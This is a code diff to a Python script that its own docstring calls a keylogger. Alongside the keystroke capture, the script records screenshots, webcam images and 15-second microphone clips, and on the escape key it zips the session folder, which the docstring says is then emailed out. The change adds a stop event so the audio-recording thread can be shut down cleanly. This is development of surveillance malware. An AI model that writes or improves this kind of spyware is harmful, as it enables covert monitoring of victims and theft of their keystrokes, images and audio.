@@ -38,7 +38,7 @@ currtime = datetime.now().strftime("%Y%m%d%H%M%S")
 sessions_folder = os.path.join(file_path, f"sessions", f"session_{currtime}")
 screenshots_folder = os.path.join(sessions_folder, "screenshots")
 webcam_folder = os.path.join(sessions_folder, "webcam_images")
-
+stop_microphone_event = threading.Event()
 # Create necessary directories
 os.makedirs(sessions_folder, exist_ok=True)
 os.makedirs(screenshots_folder, exist_ok=True)
@@ -107,7 +107,7 @@ def microphone_thread():
 
     #neeche new code
 
-    while True:
+    while not stop_microphone_event.is_set(): 
         try:
             print("Recording audio...")
             myrecording = sd.rec(int(15 * 44100), samplerate=44100, channels=2)
@@ -156,6 +156,9 @@ def on_press(key):
 def on_release(key):
     """Stop the keylogger and send email when the escape key is pressed."""
     if key == keyboard.Key.esc:
+        stop_microphone_event.set()  # Signal the microphone thread to stop
+        microphone_thread_instance.join()  # Wait for the thread to exit (optional)
+        print("Stopped audio!")
         # Compress the sessions folder into a .zip file
         archive_name = os.path.join(file_path, f"session_{currtime}.zip")  # Name for the zip archive
         shutil.make_archive(base_name=archive_name.replace('.zip', ''), format='zip', root_dir=sessions_folder)
